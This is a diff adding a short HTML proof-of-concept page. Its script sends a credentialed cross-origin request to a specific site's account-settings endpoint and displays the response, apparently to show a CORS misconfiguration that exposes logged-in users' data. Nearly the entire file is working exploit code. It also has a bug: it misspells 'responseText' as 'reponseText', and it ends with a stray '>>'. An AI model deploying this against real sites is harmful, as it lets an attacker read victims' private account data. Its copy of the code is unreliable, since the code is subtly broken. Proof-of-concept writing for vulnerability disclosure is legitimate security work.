@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>POC</title>
+</head>
+<body>
+	<h1>C'est un peu comme un serveur </h1>
+	<script>
+		var xhr=new XMLHttpRequest();
+		xhr.onreadystatechange=function(){
+			if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200){
+				alert(xhr.reponseText);
+			}
+		}
+		xhr.open('GET', 'https://scrollme.today/pipa/account/settings', true);
+		xhr.withCredentials=true;
+		xhr.send(null);
+	</script>
+</body>
+</html>>
